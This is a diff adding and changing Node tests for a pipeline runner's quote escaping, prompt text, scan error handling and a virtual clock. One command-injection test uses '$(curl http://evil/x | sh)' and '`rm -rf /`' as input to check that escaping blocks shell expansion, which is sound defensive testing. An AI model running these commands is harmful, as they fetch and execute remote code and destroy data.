@@ -87,6 +87,18 @@ test("Pipeline Runner - 安全引号转义", async (t) => {
     assert.equal(escaped, 'fix(order): support \\"retry\\" & \\\\ escape');
   });
 
+  await t.test("转义 $ 与反引号阻断命令注入", () => {
+    const input = "fix: pay $(curl http://evil/x | sh) and `rm -rf /` and ${HOME}";
+    const escaped = escapeQuotes(input);
+    // $ 与反引号前必须带上反斜杠转义，阻断 Shell 展开
+    assert.ok(escaped.includes("\\$(curl"));
+    assert.ok(escaped.includes("\\`rm"));
+    assert.ok(escaped.includes("\\${HOME}"));
+    // 确认没有任何未被转义的裸 $ 或反引号
+    assert.equal((escaped.match(/(?<!\\)\$/g) || []).length, 0);
+    assert.equal((escaped.match(/(?<!\\)`/g) || []).length, 0);
+  });
+
   await t.test("处理空值与非字符串", () => {
     assert.equal(escapeQuotes(null), "");
     assert.equal(escapeQuotes(undefined), "");
@@ -259,10 +271,10 @@ test("Pipeline Runner - 内置单仓维护提示词生成 (buildPrompt)", async 
   });
 
   await t.test("验证包含更新门槛与失效四问判定", () => {
-    assert.ok(prompt.includes("业务含义变了吗？"));
-    assert.ok(prompt.includes("接口契约变了吗？"));
-    assert.ok(prompt.includes("流程分支变了吗？"));
-    assert.ok(prompt.includes("运维排障变了吗？"));
+    assert.ok(prompt.includes("行为：文档记载的流程、分支、状态、顺序、失败传播是否变化？"));
+    assert.ok(prompt.includes("契约：文档记载的接口出入参、事件、队列、配置键语义是否变化？"));
+    assert.ok(prompt.includes("定位：文档给出的文件、类、方法是否改名或移动？"));
+    assert.ok(prompt.includes("缺失：是否新增了该文档主题内读者需要的事实"));
     assert.ok(prompt.includes("no_change_needed"));
   });
 
@@ -563,6 +575,40 @@ test("Pipeline Runner - 流程调度与观测闭环（模拟执行）", async (t
     assert.equal(result.dryRunOutput[0].repo, "changed-service");
   });
 
+  await t.test("扫描状态为 error 的仓库计为失败而非跳过", async () => {
+    const scanWithError = {
+      batch: true,
+      results: [
+        {
+          repo: "broken-service",
+          path: "/srv/workspace/broken-service",
+          status: "error",
+          hasChanges: false,
+          message: "Git error: fatal: not a git repository",
+        },
+        {
+          repo: "clean-service",
+          path: "/srv/workspace/clean-service",
+          status: "upToDate",
+          hasChanges: false,
+        },
+      ],
+    };
+    const execFn = async () => ({
+      stdout: JSON.stringify({ ok: true, data: scanWithError }),
+      stderr: "",
+    });
+
+    const result = (await runPipeline(
+      { profile: "skm", dryRun: true },
+      { execFn }
+    )) as DryRunResult;
+
+    assert.equal(result.skipped, 1);
+    assert.equal(result.pending, 0);
+    // error 条目不应出现在待派发清单中，也不应被伪装成 skipped
+  });
+
   await t.test("非预演模式未传 --dispatch-cmd 时抛出异常", async () => {
     const execFn = async () => ({
       stdout: JSON.stringify({ ok: true, data: mockScanData }),
@@ -589,6 +635,12 @@ test("Pipeline Runner - 流程调度与观测闭环（模拟执行）", async (t
   await t.test("成功闭环与超时分支覆盖", async () => {
     const dispatchedCmds: string[] = [];
     let pollCountChanged = 0;
+    // 虚拟时钟：避免真实时序受并行测试负载影响导致超时误判
+    let virtualNow = 0;
+    const nowFn = () => virtualNow;
+    const sleepFn = async (ms: number) => {
+      virtualNow += ms;
+    };
 
     const execFn = async (cmd: string) => {
       // 首次全量扫描
@@ -668,9 +720,8 @@ test("Pipeline Runner - 流程调度与观测闭环（模拟执行）", async (t
         dispatchFn: async (cmd: string) => {
           dispatchedCmds.push(cmd);
         },
-        sleepFn: async () => {
-          await new Promise((r) => setTimeout(r, 2));
-        },
+        sleepFn,
+        nowFn,
         onProgress: (p: any) => progressUpdates.push(p),
       }
     )) as PipelineSummary;
